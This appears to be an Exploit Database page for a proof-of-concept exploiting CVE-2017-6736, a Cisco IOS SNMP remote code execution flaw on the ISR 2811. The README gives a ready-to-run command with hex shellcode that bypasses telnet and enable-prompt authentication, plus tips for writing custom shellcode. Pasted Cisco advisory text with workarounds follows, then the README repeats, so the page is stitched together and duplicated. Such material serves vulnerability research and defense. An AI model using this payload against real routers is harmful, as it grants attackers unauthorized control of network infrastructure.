# CVE-2017-6736 / cisco-sa-20170629-snmp Cisco IOS remote code execution

This repository contains Proof-Of-Concept code for exploiting remote code execution vulnerability in SNMP service disclosed by Cisco Systems on June 29th 2017 - <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170629-snmp>

## Description

RCE exploit code is available for Cisco Integrated Service Router 2811. This exploit is firmware dependent. The latest firmware version is supported:

* Cisco IOS Software, 2800 Software (C2800NM-ADVENTERPRISEK9-M), Version 15.1(4)M12a, RELEASE SOFTWARE (fc1)

ROM Monitor version:

* System Bootstrap, Version 12.4(13r)T, RELEASE SOFTWARE (fc1)

Read-only community string is required to trigger the vulnerability.

## Shellcode

The exploit requires shellcode as HEX input. This repo contains an example shellcode for bypassing authentication in telnet service and in enable prompt. Shellcode to revert changes is also available. If you want to write your own shellcode feel free to do so. Just have two things in mind:

* Don't upset the watchdog by running your code for too long. Call a sleep function once in a while.
* Return execution flow back to SNMP service at the end. You can use last opcodes from the demo shellcode:

```
3c1fbfc4    lui $ra, 0xbfc4
37ff89a8    ori $ra, $ra, 0x89a8
03e00008    jr  $ra
00000000    nop

```

## Usage example

```
$ sudo python c2800nm-adventerprisek9-mz.151-4.M12a.py 192.168.88.1 public 8fb40250000000003c163e2936d655b026d620000000000002d4a821000000008eb60000000000003c1480003694f000ae96000000000000aea00000000000003c1fbfc437ff89a803e0000800000000

An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6. Only traffic directed to an affected system can be used to exploit these vulnerabilities.  The vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software. The vulnerabilities affect all versions of SNMP - Versions 1, 2c, and 3. To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system. To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system. A successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.  Customers are advised to apply the workaround as contained in the Workarounds section below. Fixed software information is available via the Cisco IOS Software Checker. All devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.  Cisco has released software updates that address these vulnerabilities. There are workarounds that address these vulnerabilities.  This advisory is available at the following link:   <https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170629-snmp>  Affected Products  * Vulnerable Products These vulnerabilities affect Cisco devices that are running a vulnerable release of Cisco IOS Software or Cisco IOS XE Software. These vulnerabilities affect all versions of SNMP, versions 1, 2c, and 3.  For information about which Cisco software releases are vulnerable, see the [Fixed Software](#fs) section of this advisory.  Devices configured with any of the following MIBs are vulnerable:    + ADSL-LINE-MIB   + ALPS-MIB   + CISCO-ADSL-DMT-LINE-MIB   + CISCO-BSTUN-MIB   + CISCO-MAC-AUTH-BYPASS-MIB   + CISCO-SLB-EXT-MIB   + CISCO-VOICE-DNIS-MIB   + CISCO-VOICE-NUMBER-EXPANSION-MIB   + TN3270E-RT-MIB All of the MIBs listed above are enabled by default when SNMP is enabled. Some of the MIBs may not be present on all systems or versions but are enabled when present.       Administrators may be accustomed to utilizing the **show snmp mib** command in privileged EXEC mode to display a list of enabled MIBs on a device. Not all of the MIBs will be displayed in the output of the **show snmp mib** command but may still be enabled. Customers are advised to implement the entire exclude list as detailed in the Workarounds section of the advisory. Determining the Cisco IOS Software Release To determine which Cisco IOS Software release is running on a device, administrators can log in to the device, use the **show version** command in the CLI, and then refer to the system banner that appears. If the device is running Cisco IOS Software, the system banner displays text similar to *Cisco Internetwork Operating System Software* or *Cisco IOS Software*. The banner also displays the installed image name in parentheses, followed by the Cisco IOS Software release number and release name. Some Cisco devices do not support the **show version** command or may provide different output.  The following example identifies a Cisco product that is running Cisco IOS Software Release 15.5(2)T1 with an installed image name of *C2951-UNIVERSALK9-M*:  ```   Router> show versionCisco IOS Software, C2951 Software (C2951-UNIVERSALK9-M), Version 15.5(2)T1, RELEASE SOFTWARE (fc1)Technical Support: http://www.cisco.com/techsupportCopyright (c) 1986-2015 by Cisco Systems, Inc.Compiled Mon 22-Jun-15 09:32 by prod_rel_team...   ```  For information about the naming and numbering conventions for Cisco IOS Software releases, see [White Paper: Cisco IOS and NX-OS Software Reference Guide](http://www.cisco.com/web/about/security/intelligence/ios-ref.html). Determining the Cisco IOS XE Software Release To determine which Cisco IOS XE Software release is running on a device, administrators can log in to the device, use the **show version** command in the CLI, and then refer to the system banner that appears. If the device is running Cisco IOS XE Software, the system banner displays *Cisco IOS XE Software* or similar text.  The following example shows the output of the **show version** command on a device that is running Cisco IOS XE Software Release 3.16.1aS:  ```   Router> show versionCisco IOS XE Software, Version 03.16.01a.S - Extended Support ReleaseCisco IOS Software, ASR1000 Software (PPC_LINUX_IOSD-ADVENTERPRISEK9-M), Version 15.5(3)S1a, RELEASE SOFTWARE (fc1)Technical Support: http://www.cisco.com/techsupportCopyright (c) 1986-2015 by Cisco Systems, Inc.Compiled Wed 04-Nov-15 17:40 by mcpre...   ```  For information about the naming and numbering conventions for Cisco IOS XE Software releases, see [White Paper: Cisco IOS and NX-OS Software Reference Guide](http://www.cisco.com/c/en/us/about/security-center/ios-nx-os-reference-guide.html). Products Confirmed Not Vulnerable No other Cisco products are currently known to be affected by these vulnerabilities.  Details  * The Simple Network Management Protocol (SNMP) is an application-layer protocol that provides a standardized framework and a common language for monitoring and managing devices in a network. It defines a message format for communication between SNMP managers and agents.  An SNMP agent gathers data from the SNMP MIB, which is the repository of information about device parameters and network data. It also responds to requests from an SNMP manager to get or set data. An SNMP agent contains MIB variables whose values can be requested or changed by an SNMP manager via *get* or *set* operations.  These vulnerabilities affect all versions of SNMP-Versions 1, 2c, and 3. An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected device via IPv4 or IPv6. Only traffic directed to the affected system can be used to exploit these vulnerabilities.  To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system. A community string is a password that is applied to a device to restrict both read-only and read-write access to the SNMP data on the device. These community strings, as with all passwords, should be chosen carefully to ensure they are not trivial. They should also be changed at regular intervals and in accordance with network security policies. For example, the strings should be changed when a network administrator changes roles or leaves the organization.  To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.  Indicators of Compromise  * Exploitation of these vulnerabilities will cause an affected device to reload and generate a *crashinfo* file. Contact the Cisco Technical Assistance Center (TAC) to review the file and determine whether the device has been compromised by exploitation of these vulnerabilities.  Workarounds  * Administrators are advised to allow only trusted users to have SNMP access on an affected system. Administrators are also advised to monitor affected systems by using the **show snmp host** command in the CLI.  In addition, administrators can mitigate these vulnerabilities by disabling the following MIBs on a device:    + ADSL-LINE-MIB   + ALPS-MIB   + CISCO-ADSL-DMT-LINE-MIB   + CISCO-BSTUN-MIB   + CISCO-MAC-AUTH-BYPASS-MIB   + CISCO-SLB-EXT-MIB   + CISCO-VOICE-DNIS-MIB   + CISCO-VOICE-NUMBER-EXPANSION-MIB   + TN3270E-RT-MIB To create or update a view entry and disable the affected MIBs, administrators can use the **snmp-server view** global configuration command, as shown in the following example:  ```   !Standard VIEW and Security Exclusionssnmp-server view NO_BAD_SNMP iso includedsnmp-server view NO_BAD_SNMP internet includedsnmp-server view NO_BAD_SNMP snmpUsmMIB excludedsnmp-server view NO_BAD_SNMP snmpVacmMIB excludedsnmp-server view NO_BAD_SNMP snmpCommunityMIB excludedsnmp-server view NO_BAD_SNMP ciscoMgmt.252 excluded!End Standard View !Advisory Specific Mappings!ADSL-LINE-MIBsnmp-server view NO_BAD_SNMP transmission.94 excluded !TN3270E-RT-MIBsnmp-server view NO_BAD_SNMP mib-2.34.9 excluded !CISCO-BSTUN-MIBsnmp-server view NO_BAD_SNMP ciscoMgmt.35 excluded !ALPS-MIBsnmp-server view NO_BAD_SNMP ciscoMgmt.95 excluded !CISCO-ADSL-DMT-LINE-MIBsnmp-server view NO_BAD_SNMP ciscoMgmt.130 excluded !CISCO-VOICE-DNIS-MIBsnmp-server view NO_BAD_SNMP ciscoMgmt.219 excluded !CISCO-SLB-EXT-MIBsnmp-server view NO_BAD_SNMP ciscoMgmt.254 excluded !CISCO-MAC-AUTH-BYPASS-MIBsnmp-server view NO_BAD_SNMP ciscoMabMIB excluded !CISCO-VOICE-NUMBER-EXPANSION-MIBsnmp-server view NO_BAD_SNMP ciscoExperiment.997 excluded   ```  To then apply this configuration to a community string, administrators can use the following command:  ```   snmp-server community mycomm view NO_BAD_SNMP RO   ```  For SNMP Version 3, administrators can use the following command:  ```   snmp-server group v3group auth read NO_BAD_SNMP write NO_BAD_SNMP   ```  Fixed Software  * Cisco has released free software updates that address the vulnerabilities described in this advisory. Customers may only install and expect support for software versions and feature sets for which they have purchased a license. By installing, downloading, accessing, or otherwise using such software upgrades, customers agree to follow the terms of the Cisco software license:   <http://www.cisco.com/en/US/docs/general/warranty/English/EU1KEN_.html>  Additionally, customers may only download software for which they have a valid license, procured from Cisco directly, or through a Cisco authorized reseller or partner. In most cases this will be a maintenance upgrade to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.  When considering software upgrades, customers are advised to regularly consult the advisories for Cisco products, which are available from the [Cisco Security Advisories and Alerts page](http://www.cisco.com/go/psirt), to determine exposure and a complete upgrade solution.  In all cases, customers should ensure that the devices to be upgraded contain sufficient memory and confirm that current hardware and software configurations will continue to be supported properly by the new release. If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.  **Customers Without Service Contracts**  Customers who purchase directly from Cisco but do not hold a Cisco service contract and customers who make purchases through third-party vendors but are unsuccessful in obtaining fixed software through their point of sale should obtain upgrades by contacting the Cisco TAC:   <http://www.cisco.com/en/US/support/tsd_cisco_worldwide_contacts.html>  Customers should have the product serial number available and be prepared to provide the URL of this advisory as evidence of entitlement to a free upgrade.  Cisco IOS and IOS XE Software To help customers determine their exposure to vulnerabilities in Cisco IOS and IOS XE Software, Cisco provides a tool, the [Cisco IOS Software Checker](https://sec.cloudapps.cisco.com/security/center/selectIOSVersion.x), that identifies any Cisco Security Advisories that impact a specific software release and the earliest release that fixes the vulnerabilities described in each advisory (“First Fixed”). If applicable, the tool also returns the earliest release that fixes all the vulnerabilities described in all the advisories identified (“Combined First Fixed”).  Customers can use this tool to perform the following tasks:    + Initiate a search by choosing one or more releases from a drop-down menu or uploading a file from a local system for the tool to parse   + Enter the output of the **show version** command for the tool to parse   + Create a custom search by including all previously published Cisco Security Advisories, a specific advisory, or all advisories in the most recent bundled publication To determine whether a release is affected by any published Cisco Security Advisory, use the [Cisco IOS Software Checker](https://sec.cloudapps.cisco.com/security/center/selectIOSVersion.x) on Cisco.com or enter a Cisco IOS Software or Cisco IOS XE Software release-for example, **15.1(4)M2** or **3.1.4S**-in the following field:  For a mapping of Cisco IOS XE Software releases to Cisco IOS Software releases, refer to the [Cisco IOS XE 2 Release Notes](https://www.cisco.com/c/en/us/td/docs/ios/ios_xe/2/release/notes/rnasr21/rnasr21_gen.html#wp3000032), [Cisco IOS XE 3S Release Notes](https://www.cisco.com/c/en/us/td/docs/ios/ios_xe/3/release/notes/asr1k_rn_3s_rel_notes/asr1k_rn_3s_sys_req.html#wp3069754), or [Cisco IOS XE 3SG Release Notes](https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst4500/release/note/OL_24726.html#pgfId-2570252), depending on the Cisco IOS XE Software release.

Description
-------------

RCE exploit code is available for Cisco Integrated Service Router 2811. This exploit is firmware dependent. The latest firmware version is supported:

- Cisco IOS Software, 2800 Software (C2800NM-ADVENTERPRISEK9-M), Version 15.1(4)M12a, RELEASE SOFTWARE (fc1)

ROM Monitor version:

- System Bootstrap, Version 12.4(13r)T, RELEASE SOFTWARE (fc1)

Read-only community string is required to trigger the vulnerability.

Shellcode
------------

The exploit requires shellcode as HEX input. This repo contains an example shellcode for bypassing authentication in telnet service and in enable prompt. Shellcode to revert changes is also available. If you want to write your own shellcode feel free to do so. Just have two things in mind:

- Don't upset the watchdog by running your code for too long. Call a sleep function once in a while.
- Return execution flow back to SNMP service at the end. You can use last opcodes from the demo shellcode:

```
3c1fbfc4    lui $ra, 0xbfc4
37ff89a8    ori $ra, $ra, 0x89a8
03e00008    jr  $ra
00000000    nop
```

Usage example
-------------

```
$ sudo python c2800nm-adventerprisek9-mz.151-4.M12a.py 192.168.88.1 public 8fb40250000000003c163e2936d655b026d620000000000002d4a821000000008eb60000000000003c1480003694f000ae96000000000000aea00000000000003c1fbfc437ff89a803e0000800000000

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
